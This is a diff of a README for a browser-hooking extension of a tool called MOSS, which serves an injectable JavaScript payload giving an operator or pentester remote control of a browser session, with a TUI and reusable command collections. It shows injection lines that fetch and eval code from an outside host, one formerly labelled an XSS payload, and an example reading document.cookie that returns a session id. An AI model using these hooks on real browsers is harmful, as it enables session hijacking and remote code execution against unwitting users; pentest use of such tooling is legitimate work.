@@ -2,9 +2,11 @@
 
 Interactive JS Debugging Agent for MOSS.
 
-Serves a browser-injectable JS payload allowing an operator or pentester remote control of a browser session. The browser polls the server for pending commands, executes them, and posts results back. Includes a TUI for interactive control, optional encryption, and a script command system for reusable command collections.
+Serves a browser-injectable JS payload allowing an operator or pentester remote control of a browser session. The browser polls the server for pending commands, executes them, and posts results back. Includes a TUI for interactive control, optional encryption, and a collection system for reusable command collections.
 
 ## Quick Start
+
+First, start the server.
 
 ```shell
 moss -e debugger -p 8000 --hostname example.com
@@ -14,23 +16,21 @@ Then inject the JS payload into a browser context:
 
 ```html
 <script src="http://example.com:8000/debugger/{RANDOM}"></script>
-```
-
-Or as an XSS payload:
-
-```
+<script>import("http://example.com:8000/debugger/{RANDOM}")</script>
 javascript:fetch("http://example.com:8000/debugger/{RANDOM}").then(r => r.text()).then(code => eval(code))
 ```
 
-Once a browser connects, the TUI prompt shows `debug [1 conns]> `. Type a JS expression:
+Once the JS runs, the TUI prompt shows `debug [1 conns]> `.
 
-```
+Now you can interact with the agent by entering a JS expression:
+
+```text
 debug [1 conns]> document.cookie
 ```
 
-The result appears as:
+When the agent polls the server, the server responds with pending payloads. The agent then `eval`s the payloads and sends the results back to the server:
 
-```
+```text
  ✓ [2026-05-23 07:42:00] (document.cookie) (browser1) sessionid=abc123
 ```
 
@@ -102,7 +102,7 @@ Clear all pending commands.
 
 ### `/load <path>`
 
-Load a `.json` script file at runtime. Path resolution (in order):
+Load a `.json` collection file at runtime. Path resolution (in order):
 
 1. **Absolute path** — used directly.
 2. **Debugger scripts directory** — `moss/ext/debugger/<path>` (relative to the moss package).
@@ -111,14 +111,14 @@ Load a `.json` script file at runtime. Path resolution (in order):
 If not found, prints an error and continues.
 
 
-### `/run [script[.cmd] [args...]]`
+### `/run [collection[.cmd] [args...]]`
 
-Execute script commands loaded from `.json` script files.
+Execute collection commands loaded from `.json` collection files.
 
 | Form | Behavior |
 |------|----------|
 | `/run` | List all loaded scripts and their commands. |
-| `/run scriptname` | List commands in a script with descriptions and arg counts. |
+| `/run scriptname` | List commands in a collection with descriptions and arg counts. |
 | `/run scriptname.cmd` | Execute a command (no args). |
 | `/run scriptname.cmd arg0 "arg 1"` | Execute with positional args; `{0}`, `{1}` are substituted. |
 
@@ -141,54 +141,9 @@ When run via `/run`, the result label shows the shorthand command name (e.g. `re
 
 Scripts are JSON files defining reusable commands with namespacing, arg substitution, and descriptions.
 
-### JSON Schema
+### Specification
 
-```json
-{
-  "$schema": "https://json-schema.org/draft-07/schema#",
-  "type": "object",
-  "required": ["commands"],
-  "additionalProperties": false,
-  "properties": {
-    "name": {
-      "type": "string",
-      "description": "Script name for namespacing (defaults to filename stem)"
-    },
-    "commands": {
-      "type": "object",
-      "description": "Map of command names to definitions",
-      "patternProperties": {
-        "^[a-zA-Z_][a-zA-Z0-9_-]*$": { "$ref": "#/definitions/command" }
-      },
-      "additionalProperties": false,
-      "minProperties": 1
-    }
-  },
-  "definitions": {
-    "command": {
-      "type": "object",
-      "required": ["code"],
-      "additionalProperties": false,
-      "properties": {
-        "code": {
-          "type": "string",
-          "description": "JavaScript code. Use {0}, {1}, etc. for positional arguments"
-        },
-        "description": {
-          "type": "string",
-          "description": "Human-readable description"
-        },
-        "args": {
-          "type": "integer",
-          "minimum": 0,
-          "default": 0,
-          "description": "Number of positional arguments expected"
-        }
-      }
-    }
-  }
-}
-```
+You can find the JSON schema in [debugger.py](../../moss/ext/debugger.py#L251).
 
 ### Schema Validation
 
@@ -235,7 +190,7 @@ pip install jsonschema
 
 ### The `_sendResult` Function
 
-Script commands can use the `_sendResult(id, result, error)` function to asynchronously send results back. This is useful for async patterns like `fetch()`:
+Collection commands can use the `_sendResult(id, result, error)` function to asynchronously send results back. This is useful for async patterns like `fetch()`:
 
 ```javascript
 void fetch('{0}').then(r=>r.text()).then(t=>_sendResult(m.id,t))
@@ -261,10 +216,6 @@ void fetch('{0}').then(r=>r.text()).then(t=>_sendResult(m.id,t))
    - `id` — the command ID (always available as `m.id`)
    - `result` — the result value (stringified automatically)
    - `error` — optional error string; if provided, the result is treated as an error
-
-### Script Loading at Startup
-
-Scripts are loaded at runtime via `/load <path>`. There is no CLI flag for pre-loading scripts at startup.
 
 ## Encryption
 
